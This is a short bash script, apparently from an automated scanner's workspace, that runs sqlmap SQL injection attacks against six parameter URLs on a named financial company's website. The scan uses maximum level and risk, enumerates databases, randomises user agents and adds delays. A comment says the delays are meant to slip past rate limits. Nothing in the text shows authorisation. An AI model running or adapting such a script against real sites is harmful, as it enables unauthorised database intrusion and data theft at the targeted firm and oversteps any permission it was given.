#!/bin/bash
# Anti-rate-limit: sequential sqlmap over each real parameter, ~1 req/sec
T="https://www.infinitycapital.bh"
W=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs
mkdir -p "$W/sqlo"
run () {
  name="$1"; url="$2"
  echo "############ SQLMAP $name : $url"
  sqlmap -u "$url" --batch --level=5 --risk=3 --dbs --threads=4 --delay=0.4 \
    --random-agent --output-dir="$W/sqlo" 2>&1 | tail -25
  echo "############ END $name"
}
run home_page  "https://www.infinitycapital.bh/?id=1&search=test&page=2"
run home_page2 "https://www.infinitycapital.bh/?page=2"
run home_id    "https://www.infinitycapital.bh/?id=1"
run home_zzz   "https://www.infinitycapital.bh/?zzz=1"
run contact_cb "https://www.infinitycapital.bh/contact?cb=1"
run contact_x  "https://www.infinitycapital.bh/contact?x=1"
